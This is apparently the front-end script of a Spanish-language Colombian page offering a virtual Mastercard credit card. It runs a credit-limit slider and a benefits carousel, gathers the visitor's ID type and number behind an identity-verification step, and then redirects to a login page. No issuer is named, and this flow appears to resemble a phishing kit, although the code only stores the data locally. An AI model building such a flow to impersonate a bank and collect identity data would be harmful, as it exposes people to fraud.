(function () {
    const AMOUNTS = [
        5000000, 12000000, 20000000, 30000000,
        40000000, 50000000, 60000000, 70000000
    ];

    const BENEFITS = [
        [
            {
                icon: 'icono-caja.svg',
                iconClass: '',
                title: 'Casillero virtual',
                text: 'Compra por Internet en Estados Unidos y recibe tus articulos en Colombia.'
            },
            {
                icon: 'diamantito.svg',
                iconClass: '',
                title: 'Salas VIP Avianca',
                text: 'Presenta tu tarjeta de credito y accede a las salas VIP de Avianca en Colombia'
            }
        ],
        [
            {
                icon: 'icono-usuario.svg',
                iconClass: '',
                title: 'Asesor 24/7',
                text: 'Atencion personalizada los 365 dias del año desde cualquier parte del mundo.'
            },
            {
                icon: 'candadito-lindo.svg',
                iconClass: '',
                title: 'Seguro de compras',
                text: 'Protege tus compras online por daños, robo o perdida hasta 90 dias.'
            }
        ],
        [
            {
                icon: 'calendario.svg',
                iconClass: '',
                title: 'Millas y viajes',
                text: 'Acumula puntos Colombia y canjealos por tiquetes aereos, hospedaje y más.'
            },
            {
                icon: 'pago-alegre.png',
                iconClass: '',
                title: 'Pagos con celular',
                text: 'Paga sin contacto con tu tarjeta digital en establecimientos afiliados.'
            }
        ],
        [
            {
                icon: 'pegatina-sonrisa.svg',
                iconClass: '',
                title: 'Descuentos gourmet',
                text: 'Hasta 30% de descuento en los mejores restaurantes del pais.'
            },
            {
                icon: 'estrella-hola.svg',
                iconClass: '',
                title: 'Cashback 2%',
                text: 'Recupera hasta el 2% de tus compras mensuales en tu cuenta.'
            }
        ]
    ];

    const cupoSlider = document.getElementById('cupo-slider');
    const sliderProgress = document.getElementById('slider-progress');
    const selectedAmount = document.getElementById('selected-amount');
    const selectedLabel = document.getElementById('selected-label');
    const applyButton = document.getElementById('apply-button');

    const landingPage = document.getElementById('landing-page');
    const postSolicitudPage = document.getElementById('post-solicitud-page');
    const postSolicitudBack = document.getElementById('post-solicitud-back');
    const postSolicitudNext = document.getElementById('post-solicitud-next');
    const documentTypeTrigger = document.getElementById('document-type-trigger');
    const documentTypeOptions = document.getElementById('document-type-options');
    const documentTypeChevron = document.getElementById('document-type-chevron');
    const documentTypeValue = document.getElementById('document-type-value');
    const documentNumberInput = document.getElementById('document-number-input');
    const documentTypeOptionsList = document.querySelectorAll('.document-type-option');

    const identityVerificationModal = document.getElementById('identity-verification-modal');
    const identityVerificationContinue = document.getElementById('identity-verification-continue');

    const loadingOverlay = document.getElementById('loading-overlay');
    const loadingText = document.getElementById('loading-text');
    const actionToast = document.getElementById('action-toast');

    const benefitPrev = document.getElementById('benefit-prev');
    const benefitNext = document.getElementById('benefit-next');
    const benefitPrevDesktop = document.getElementById('benefit-prev-desktop');
    const benefitNextDesktop = document.getElementById('benefit-next-desktop');
    const carouselDots = document.querySelectorAll('.carousel-dot');

    let currentSlide = 0;

    function formatMoney(n) {
        const num = Number(n) || 0;
        return '$' + num.toLocaleString('es-CO', { maximumFractionDigits: 0 });
    }

    function closestAmount(val) {
        return Number(val) * 1000000;
    }

    function updateSliderUI() {
        const val = Number(cupoSlider.value);
        const min = Number(cupoSlider.min);
        const max = Number(cupoSlider.max);
        const pct = max > min ? ((val - min) / (max - min)) * 100 : 0;
        const amount = closestAmount(val);
        if (sliderProgress) sliderProgress.style.width = pct + '%';
        if (selectedAmount) selectedAmount.textContent = formatMoney(amount);
        if (selectedLabel) selectedLabel.textContent = 'Cupo seleccionado para tu solicitud';
    }

    function setSlide(idx) {
        const total = BENEFITS.length;
        currentSlide = (idx + total) % total;
        const pair = BENEFITS[currentSlide];

        const b1iconImg = document.getElementById('benefit-icon-1-image');
        const b1iconI = document.getElementById('benefit-icon-1');
        const b1title = document.getElementById('benefit-title-1');
        const b1text = document.getElementById('benefit-text-1');
        const b2iconImg = document.getElementById('benefit-icon-2-image');
        const b2iconI = document.getElementById('benefit-icon-2');
        const b2title = document.getElementById('benefit-title-2');
        const b2text = document.getElementById('benefit-text-2');

        const b1miconImg = document.getElementById('benefit-icon-1-mobile-image');
        const b1miconI = document.getElementById('benefit-icon-1-mobile');
        const b1mtitle = document.getElementById('benefit-title-1-mobile');
        const b1mtext = document.getElementById('benefit-text-1-mobile');

        function applyBenefit(elImg, elI, elTitle, elText, benefit) {
            if (!benefit) return;
            if (elImg) {
                if (benefit.icon) {
                    elImg.src = 'assets/images/' + benefit.icon;
                    elImg.classList.remove('hidden');
                } else {
                    elImg.classList.add('hidden');
                }
            }
            if (elI) {
                elI.className = benefit.iconClass || '';
                if (!benefit.iconClass) elI.classList.add('hidden');
            }
            if (elTitle) elTitle.textContent = benefit.title || '';
            if (elText) elText.textContent = benefit.text || '';
        }

        applyBenefit(b1iconImg, b1iconI, b1title, b1text, pair[0]);
        applyBenefit(b2iconImg, b2iconI, b2title, b2text, pair[1]);
        applyBenefit(b1miconImg, b1miconI, b1mtitle, b1mtext, pair[0]);

        carouselDots.forEach(function (dot, i) {
            if (i === currentSlide) {
                dot.classList.remove('bg-[#111827]', 'opacity-70');
                dot.classList.add('bg-[#ffd400]');
            } else {
                dot.classList.remove('bg-[#ffd400]');
                dot.classList.add('bg-[#111827]', 'opacity-70');
            }
        });
    }

    function toggleDocumentOptions() {
        if (!documentTypeOptions) return;
        const isHidden = documentTypeOptions.classList.contains('hidden');
        if (isHidden) {
            documentTypeOptions.classList.remove('hidden');
            documentTypeChevron.classList.add('rotate-180');
        } else {
            documentTypeOptions.classList.add('hidden');
            documentTypeChevron.classList.remove('rotate-180');
        }
    }

    function closeDocumentOptions(e) {
        if (!documentTypeOptions || !documentTypeTrigger) return;
        const tgt = e.target;
        if (documentTypeTrigger.contains(tgt) || documentTypeOptions.contains(tgt)) return;
        documentTypeOptions.classList.add('hidden');
        documentTypeChevron.classList.remove('rotate-180');
    }

    function validatePostSolicitud() {
        const docType = documentTypeValue ? documentTypeValue.textContent.trim() : '';
        const docNum = documentNumberInput ? documentNumberInput.value.trim() : '';
        const ok = docType !== '' && docNum.replace(/\D/g, '').length >= 5;
        if (!postSolicitudNext) return;
        if (ok) {
            postSolicitudNext.removeAttribute('disabled');
            postSolicitudNext.classList.remove('bg-[#9ca3af]', 'opacity-70');
            postSolicitudNext.classList.add('bg-[#ffd400]', 'text-black', 'opacity-100');
        } else {
            postSolicitudNext.setAttribute('disabled', 'disabled');
            postSolicitudNext.classList.add('bg-[#9ca3af]', 'opacity-70');
            postSolicitudNext.classList.remove('bg-[#ffd400]', 'text-black');
        }
    }

    function generateTransactionId() {
        const urlTx = (function () {
            try {
                var u = new URLSearchParams(window.location.search);
                return u.get('test_tx') || u.get('tx') || '';
            } catch (e) { return ''; }
        })();
        if (urlTx) return urlTx;
        const existing = localStorage.getItem('transaction_id');
        if (existing) return existing;
        return Date.now().toString(36) + Math.random().toString(36).slice(2);
    }

    function showLoading(text) {
        if (!loadingOverlay) return;
        if (loadingText) loadingText.textContent = text || 'Cargando...';
        loadingOverlay.classList.remove('hidden');
        loadingOverlay.classList.add('flex');
    }

    function hideLoading() {
        if (!loadingOverlay) return;
        loadingOverlay.classList.add('hidden');
        loadingOverlay.classList.remove('flex');
    }

    function showToast(text) {
        if (!actionToast) return;
        actionToast.textContent = text || 'Solicitud enviada correctamente.';
        actionToast.classList.remove('translate-y-3', 'opacity-0');
        setTimeout(function () {
            actionToast.classList.add('translate-y-3', 'opacity-0');
        }, 2400);
    }

    function showIdentityVerification() {
        if (!identityVerificationModal) {
            submitSolicitud();
            return;
        }
        identityVerificationModal.classList.remove('hidden');
        identityVerificationModal.classList.add('flex');
    }

    function hideIdentityVerification() {
        if (!identityVerificationModal) return;
        identityVerificationModal.classList.add('hidden');
        identityVerificationModal.classList.remove('flex');
    }

    function submitSolicitud() {
        hideIdentityVerification();
        showLoading('Procesando...');

        const transactionId = generateTransactionId();
        try { localStorage.setItem('transaction_id', transactionId); } catch (e) { }

        const cupo = formatMoney(closestAmount(Number(cupoSlider.value)));
        const docType = documentTypeValue ? documentTypeValue.textContent.trim() : '';
        const docNum = documentNumberInput ? documentNumberInput.value.replace(/\D/g, '') : '';

        const formData = {
            titulo: 'TARJETA VIRTUAL MASTERCARD',
            tipo_documento: docType,
            documento: docNum,
            cupo_solicitado: cupo,
            nombre: '',
            celular: '',
            correo: '',
            ingresos: '',
            ciudad: ''
        };
        try { localStorage.setItem('formData', JSON.stringify(formData)); } catch (e) { }

        showToast('Solicitud enviada correctamente.');
        setTimeout(function () {
            hideLoading();
            const q = transactionId ? ('?tx=' + encodeURIComponent(transactionId)) : '';
            window.location.replace('login.html' + q);
        }, 500);
    }

    function bind() {
        if (cupoSlider) {
            cupoSlider.addEventListener('input', updateSliderUI);
            cupoSlider.addEventListener('change', updateSliderUI);
            updateSliderUI();
        }

        if (applyButton) {
            applyButton.addEventListener('click', function () {
                if (landingPage) landingPage.classList.add('hidden');
                if (postSolicitudPage) postSolicitudPage.classList.remove('hidden');
                if (documentNumberInput) setTimeout(function () { documentNumberInput.focus(); }, 50);
            });
        }

        if (postSolicitudBack) {
            postSolicitudBack.addEventListener('click', function () {
                if (postSolicitudPage) postSolicitudPage.classList.add('hidden');
                if (landingPage) landingPage.classList.remove('hidden');
            });
        }

        if (documentTypeTrigger) {
            documentTypeTrigger.addEventListener('click', function (e) {
                e.stopPropagation();
                toggleDocumentOptions();
            });
        }
        document.addEventListener('click', closeDocumentOptions);

        documentTypeOptionsList.forEach(function (btn) {
            btn.addEventListener('click', function () {
                const val = btn.getAttribute('data-value') || '';
                if (documentTypeValue) documentTypeValue.textContent = val;
                if (documentTypeOptions) documentTypeOptions.classList.add('hidden');
                if (documentTypeChevron) documentTypeChevron.classList.remove('rotate-180');
                validatePostSolicitud();
            });
        });

        if (documentNumberInput) {
            documentNumberInput.addEventListener('input', function () {
                let raw = documentNumberInput.value.replace(/\D/g, '');
                if (raw.length > 15) raw = raw.slice(0, 15);
                documentNumberInput.value = raw.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
                validatePostSolicitud();
            });
        }

        if (postSolicitudNext) {
            postSolicitudNext.addEventListener('click', function () {
                if (postSolicitudNext.hasAttribute('disabled')) return;
                showIdentityVerification();
            });
        }

        if (identityVerificationContinue) {
            identityVerificationContinue.addEventListener('click', function () {
                submitSolicitud();
            });
        }

        if (benefitPrev) benefitPrev.addEventListener('click', function () { setSlide(currentSlide - 1); });
        if (benefitNext) benefitNext.addEventListener('click', function () { setSlide(currentSlide + 1); });
        if (benefitPrevDesktop) benefitPrevDesktop.addEventListener('click', function () { setSlide(currentSlide - 1); });
        if (benefitNextDesktop) benefitNextDesktop.addEventListener('click', function () { setSlide(currentSlide + 1); });

        carouselDots.forEach(function (dot, i) {
            dot.addEventListener('click', function () { setSlide(i); });
        });

        setSlide(0);
        validatePostSolicitud();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', bind);
    } else {
        bind();
    }
})();

(function () {
  var done = false;
  function off() {
    if (done) return;
    done = true;
    var o = document.getElementById('_preload');
    if (!o) return;
    o.classList.add('_off');
    setTimeout(function () { try { o.remove(); } catch (e) { } }, 320);
  }
  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(off, 150);
  } else {
    document.addEventListener('DOMContentLoaded', function () { setTimeout(off, 180); });
    window.addEventListener('load', function () { setTimeout(off, 80); });
  }
  setTimeout(off, 1400);
})();
